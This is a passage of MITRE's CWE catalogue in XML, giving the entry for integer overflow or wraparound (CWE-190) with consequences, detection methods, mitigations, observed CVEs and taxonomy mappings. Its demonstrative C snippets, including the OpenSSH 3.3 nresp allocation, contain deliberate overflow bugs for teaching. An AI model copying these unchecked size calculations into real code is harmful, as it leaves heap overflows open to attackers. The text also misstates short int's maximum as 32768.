					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="190" Name="Integer Overflow or Wraparound" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.</Description>
         <Extended_Description>An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000" Chain_ID="680"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Impact>DoS: Instability</Impact>
               <Note>This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Memory</Impact>
               <Note>If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Black Box</Method>
               <Description>Sometimes, evidence of this weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring follow-up manual methods to diagnose the underlying problem.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Ensure that all protocols are strictly defined, such that all out-of-bounds behavior can be identified simply, and require strict conformance to the protocol.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-3">
               <Phase>Requirements</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>
                  <xhtml:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>If possible, choose a language or compiler that performs automatic bounds checking.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Use libraries or frameworks that make it easier to handle numbers without unexpected consequences.</xhtml:p>
                  <xhtml:p>Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-8">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.</xhtml:p>
                  <xhtml:p>Use unsigned integers where possible. This makes it easier to perform validation for integer overflows. When signed integers are required, ensure that the range check includes minimum values as well as maximum values.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-36">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, "not-a-number" calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7]</xhtml:p>
                  <xhtml:p>Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-26">
               <Phase>Implementation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-33">
               <Intro_Text>The following image processing code allocates a table for images.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>img_t table_ptr; /*struct containing img data, 10kB each*/<xhtml:br/>int num_imgs;<xhtml:br/>...<xhtml:br/>num_imgs = get_num_imgs();<xhtml:br/>table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-1">
               <Intro_Text>The following code excerpt from OpenSSH 3.3 demonstrates a classic case of integer overflow:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>nresp = packet_get_int();<xhtml:br/>if (nresp &gt; 0) {<xhtml:div style="margin-left:1em;">response = xmalloc(nresp*sizeof(char*));<xhtml:br/>for (i = 0; i &lt; nresp; i++) response[i] = packet_get_string(NULL);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If nresp has the value 1073741824 and sizeof(char*) has its typical value of 4, then the result of the operation nresp*sizeof(char*) overflows, and the argument to xmalloc() will be 0. Most malloc() implementations will happily allocate a 0-byte buffer, causing the subsequent loop iterations to overflow the heap buffer response.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-2">
               <Intro_Text>Integer overflows can be complicated and difficult to detect. The following example is an attempt to show how an integer overflow may lead to undefined looping behavior:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>short int bytesRec = 0;<xhtml:br/>char buf[SOMEBIGNUM];<xhtml:br/>
                     <xhtml:br/>while(bytesRec &lt; MAXGET) {<xhtml:div style="margin-left:1em;">bytesRec += getFromInput(buf+bytesRec);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>In the above case, it is entirely possible that bytesRec may overflow, continuously creating a lower number than MAXGET and also overwriting the first MAXGET-1 bytes of buf.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-3">
               <Intro_Text>In this example the method determineFirstQuarterRevenue is used to determine the first quarter revenue for an accounting/business application. The method retrieves the monthly sales totals for the first three months of the year, calculates the first quarter sales totals from the monthly sales totals, calculates the first quarter revenue based on the first quarter sales, and finally saves the first quarter revenue results to the database.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#define JAN 1<xhtml:br/>#define FEB 2<xhtml:br/>#define MAR 3<xhtml:br/>
                     <xhtml:br/>short getMonthlySales(int month) {...}<xhtml:br/>
                     <xhtml:br/>float calculateRevenueForQuarter(short quarterSold) {...}<xhtml:br/>
                     <xhtml:br/>int determineFirstQuarterRevenue() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// Variable for sales revenue for the quarter</xhtml:i>
                           <xhtml:br/>float quarterRevenue = 0.0f;<xhtml:br/>
                           <xhtml:br/>short JanSold = getMonthlySales(JAN); /* Get sales in January */<xhtml:br/>short FebSold = getMonthlySales(FEB); /* Get sales in February */<xhtml:br/>short MarSold = getMonthlySales(MAR); /* Get sales in March */<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// Calculate quarterly total</xhtml:i>
                           <xhtml:br/>short quarterSold = JanSold + FebSold + MarSold;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// Calculate the total revenue for the quarter</xhtml:i>
                           <xhtml:br/>quarterRevenue = calculateRevenueForQuarter(quarterSold);<xhtml:br/>
                           <xhtml:br/>saveFirstQuarterRevenue(quarterRevenue);<xhtml:br/>
                           <xhtml:br/>return 0;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, in this example the primitive type short int is used for both the monthly and the quarterly sales variables. In C the short int primitive type has a maximum value of 32768. This creates a potential integer overflow if the value for the three monthly sales adds up to more than the maximum value for the short int primitive type. An integer overflow can lead to data corruption, unexpected behavior, infinite loops and system crashes. To correct the situation the appropriate primitive type should be used, as in the example below, and/or provide some validation mechanism to ensure that the maximum value for the primitive type is not exceeded.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>...<xhtml:br/>float calculateRevenueForQuarter(long quarterSold) {...}<xhtml:br/>
                     <xhtml:br/>int determineFirstQuarterRevenue() {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:i>// Calculate quarterly total</xhtml:i>
                           <xhtml:br/>long quarterSold = JanSold + FebSold + MarSold;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// Calculate the total revenue for the quarter</xhtml:i>
                           <xhtml:br/>quarterRevenue = calculateRevenueForQuarter(quarterSold);<xhtml:br/>
                           <xhtml:br/>...</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Note that an integer overflow could also occur if the quarterSold variable has a primitive type long but the method calculateRevenueForQuarter has a parameter of type short.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-43537</Reference>
               <Description>Chain: in a web browser, an unsigned 64-bit integer is forcibly cast to a 32-bit integer (CWE-681) and potentially leading to an integer overflow (CWE-190). If an integer overflow occurs, this can cause heap memory corruption (CWE-122)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-43537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-21668</Reference>
               <Description>Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-21668</Link>
            </Observed_Example>
            <Observed_Example>
              <Reference>CVE-2022-0545</Reference>
               <Description>Chain: 3D renderer has an integer overflow (CWE-190) leading to write-what-where condition (CWE-123) using a crafted image.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-0545</Link>
            </Observed_Example> 
            <Observed_Example>
               <Reference>CVE-2021-30860</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-30663</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30663</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2018-10887</Reference>
               <Description>Chain: unexpected sign extension (CWE-194) leads to integer overflow (CWE-190), causing an out-of-bounds read (CWE-125)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-10887</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-1010006</Reference>
               <Description>Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-1010006</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1866</Reference>
               <Description>Chain: integer overflow (CWE-190) causes a negative signed value, which later bypasses a maximum-only check (CWE-839), leading to heap-based buffer overflow (CWE-122).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1866</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2753</Reference>
               <Description>Chain: integer overflow leads to use-after-free</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1513</Reference>
               <Description>Chain: integer overflow in securely-coded mail program leads to buffer overflow. In 2005, this was regarded as unrealistic to exploit, but in 2020, it was rediscovered to be easier to exploit due to evolutions of the technology.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1513</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0391</Reference>
               <Description>Integer overflow via a large number of arguments.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0391</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0639</Reference>
               <Description>Integer overflow in OpenSSH as listed in the demonstrative examples.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0639</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1141</Reference>
               <Description>Image with large width and height leads to integer overflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1141</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0102</Reference>
               <Description>Length value of -1 leads to allocation of 0 bytes and resultant heap overflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0102</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2013</Reference>
               <Description>Length value of -1 leads to allocation of 0 bytes and resultant heap overflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-1000121</Reference>
               <Description>chain: unchecked message size metadata allows integer overflow (CWE-190) leading to buffer overflow (CWE-119).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-1000121</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2013-1591</Reference>
	      <Description>Chain: an integer overflow (CWE-190) in the image size calculation causes an infinite loop (CWE-835) which sequentially allocates buffers without limits (CWE-1325) until the stack is full.</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2013-1591</Link>
	    </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Number Processing</Functional_Area>
            <Functional_Area>Memory Management</Functional_Area>
            <Functional_Area>Counters</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Integer overflow (wrap or wraparound)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Integer Overflow</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Integer overflow</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>INT18-C</Entry_ID>
               <Entry_Name>Evaluate integer expressions in a larger size before comparing or assigning to that size</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>INT30-C</Entry_ID>
               <Entry_Name>Ensure that unsigned integer operations do not wrap</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>INT32-C</Entry_ID>
               <Entry_Name>Ensure that operations on signed integers do not result in overflow</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>INT35-C</Entry_ID>
               <Entry_Name>Evaluate integer expressions in a larger size before comparing or assigning to that size</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM07-C</Entry_ID>
               <Entry_Name>Ensure that the arguments to calloc(), when multiplied, do not wrap</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM35-C</Entry_ID>
               <Entry_Name>Allocate sufficient memory for an object</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>3</Entry_ID>
               <Entry_Name>Integer Overflows</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
              <Entry_ID>SFP1</Entry_ID>
              <Entry_Name>Glitch in computation</Entry_Name>
            </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 3-3</Entry_ID>
	      <Entry_Name>Req SR 3.5</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 3-3</Entry_ID>
	      <Entry_Name>Req SR 7.2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SR-2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SI-2</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SVV-1</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-1</Entry_ID>
	      <Entry_Name>Req SVV-3</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 3.5</Entry_Name>
	    </Taxonomy_Mapping>
	    <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <Entry_ID>Part 4-2</Entry_ID>
	      <Entry_Name>Req CR 7.2</Entry_Name>
	    </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="92"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-145"/>
            <Reference External_Reference_ID="REF-146"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 20, &#34;Integer Overflows&#34; Page 620"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 7: Integer Overflows.&#34; Page 119"/>
            <Reference External_Reference_ID="REF-106"/>
            <Reference External_Reference_ID="REF-150"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 6, &#34;Signed Integer Boundaries&#34;, Page 220"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">Integer overflows can be primary to buffer overflows.</Note>
            <Note Type="Terminology">"Integer overflow" is sometimes used to cover several types of errors, including signedness errors, or buffer overflows that involve manipulation of integer data types instead of characters. Part of the confusion results from the fact that 0xffffffff is -1 in a signed context. Other confusion also arises because of the role that integer overflows have in chains.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Potential_Mitigations, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Functional_Areas, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
